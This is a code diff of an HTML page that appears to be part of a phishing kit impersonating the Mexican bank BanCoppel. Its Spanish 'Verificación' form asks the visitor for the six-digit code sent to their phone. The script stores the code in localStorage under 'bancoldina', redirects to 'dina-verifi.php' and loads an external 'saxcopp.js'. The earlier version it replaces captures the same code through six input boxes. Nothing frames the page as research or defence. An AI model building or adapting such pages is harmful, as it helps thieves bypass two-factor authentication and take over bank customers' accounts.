@@ -1,164 +1,92 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image-based Website</title>
-    <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verificación</title>
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <link rel="stylesheet" href="util.css">
+  <link rel="stylesheet" href="main.css">
+  <style>
+    .textypn1, .textypn2 {
+      text-align: center;
+      margin-bottom: 20px;
     }
-    body, html {
-        height: 100%;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        background-color: #f0f0f0;
+    .textypn1 span {
+      font-size: 28px;
+      color: #003995;
     }
-    .image-container {
-        width: 100%;
-        height: 100%;
-        overflow: hidden;
-        position: relative;
+    .textypn2 span {
+      font-size: 16px;
+      color: gray;
     }
-    .image-container img {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
+    .container-login100 {
+      background-image: url('img/fondo.jpg');
+      background-size: cover;
+      position: absolute;
+      width: 100%;
+      height: 100%;
     }
-    .center-box {
-        position: absolute;
-        top: 60%;
-        left: 49.7%;
-        transform: translate(-50%, -50%);
-        background-color: rgb(255, 255, 255);
-        width: 320px; /* Ajusta el tamaño según sea necesario */
-        height: 60px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        border-radius: 8px;
-    }
-    .center-box .input-container {
-        position: relative;
-        width: 100%;
-        display: flex;
-        justify-content: space-between;
-        gap: 1px; /* Espacio entre los inputs */
-    }
-    .password-input {
-        width: 40px;
-        height: 60px;
-        text-align: center;
-        font-size: 20px;
-        border: 1px solid #000000;
-        border-radius: 5px;
-        margin-right: 10px; /* Margen entre los inputs */
-    }
-    .button-container {
-        position: absolute;
-        top: 77.5%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        display: flex;
-        flex-direction: column; /* Cambiado a 'column' para poner los botones uno debajo del otro */
-        gap: 24px; /* Espacio entre los botones */
-        transition: top 0.3s ease-in-out; /* Suavizar el movimiento */
-    }
-    .button-container button {
-        padding: 15px 120px;
-        font-size: 16px;
-        border: none;
-        border-radius: 50px;
-        font-weight: bold;
-        color: rgb(1, 1, 1);
-        cursor: pointer;
-        transition: background-color 0.3s ease;
-    }
-    .button-container button:first-child {
-        background-color: #ffda37;
-        border: 1px solid black;
-    }
-    .button-container button:first-child:hover {
-        background-color: #ffda37;
-    }
-    .button-container button:last-child {
-        background-color: #bababa;
-    }
-    .button-container button:last-child:hover {
-        background-color: #bababa;
-    }
-</style>
-
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  </style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="img/cel3.jpg" alt="Background Image">
-        <div class="center-box">
-            <div class="input-container">
-                <input type="tel" class="password-input" maxlength="1" id="input1">
-                <input type="tel" class="password-input" maxlength="1" id="input2">
-                <input type="tel" class="password-input" maxlength="1" id="input3">
-                <input type="tel" class="password-input" maxlength="1" id="input4">
-                <input type="tel" class="password-input" maxlength="1" id="input5"> <!-- Nuevo input -->
-                <input type="tel" class="password-input" maxlength="1" id="input6"> <!-- Nuevo input -->
-            </div>
-        </div>
-        <div class="button-container">
-            <button id="continuar">Continuar</button>
-            <button id="cancelar">Cancelar</button>
-        </div>
+
+  <header id="main-header">
+    <a class="logo-header" href="index.html">
+      <img src="https://www.westernunion.com/content/dam/wu/rmt/BanCoppel.png">
+    </a>
+    <div class="menu-header" href="index.html">
+      <div id="bar-menu" class="bar-menu">
+        <span></span><span></span><span></span>
+      </div>
     </div>
+  </header>
 
-    <script>
-        const inputs = document.querySelectorAll('.password-input');
+  <div class="limiter">
+    <div class="container-login100">
+      <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
 
-        // Añadir validación de solo números
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                const value = e.target.value;
-                // Solo permitir números
-                if (!/^\d$/.test(value)) {
-                    e.target.value = ''; // Borra si no es un número
-                } else {
-                    if (index < inputs.length - 1 && e.target.value !== '') {
-                        inputs[index + 1].focus();
-                    }
-                }
-            });
+        <form class="login100-form validate-form" onsubmit="return enviarCodigo()" method="post">
+          <div class="textypn1"><span>Verificación</span></div>
+          <div class="textypn2"><span>Ingresa el código de 6 dígitos enviado a tu número</span></div>
 
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
-        });
+          <div class="wrap-input101 validate-input" data-validate="">
+            <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" name="codigo_otp" id="codigo_otp"
+              maxlength="6" minlength="6" required placeholder="Ingresa tu código"
+              onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+            <span class="focus-input100" data-symbol=""></span>
+          </div>
 
-        document.getElementById('continuar').addEventListener('click', () => {
-            const inputValues = Array.from(document.querySelectorAll('.password-input'))
-                                      .map(input => input.value)
-                                      .join('');
-            localStorage.setItem('bancoldina', inputValues);
-            window.location.href = 'dina-verifi.php';
-        });
+          <br><br>
 
-        document.getElementById('cancelar').addEventListener('click', () => {
-            window.location.href = 'index.html';
-        });
+          <div class="container-login100-form-btn">
+            <div class="wrap-login100-form-btn">
+              <div class="login100-form-bgbtn"></div>
+              <button type="submit" style="height:50px; width:100%;" class="login100-form-btn">
+                Continuar
+              </button>
+            </div>
+          </div>
+        </form>
 
-        // Detectar apertura del teclado
-        window.addEventListener('resize', () => {
-            const buttonContainer = document.querySelector('.button-container');
-            if (window.innerHeight < 500) {  // Si la altura de la ventana es pequeña, el teclado está abierto
-                buttonContainer.style.top = '90%';  // Mover los botones hacia abajo
-            } else {
-                buttonContainer.style.top = '80.5%';  // Posición original
-            }
-        });
-    </script>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function enviarCodigo() {
+      const otp = document.getElementById("codigo_otp").value;
+      if (otp.length === 6) {
+        localStorage.setItem("bancoldina", otp);
+        window.location.href = "dina-verifi.php";
+        return false;
+      } else {
+        alert("Debes ingresar los 6 dígitos.");
+        return false;
+      }
+    }
+  </script>
+
+  <script src="saxcopp.js"></script>
 </body>
 </html>
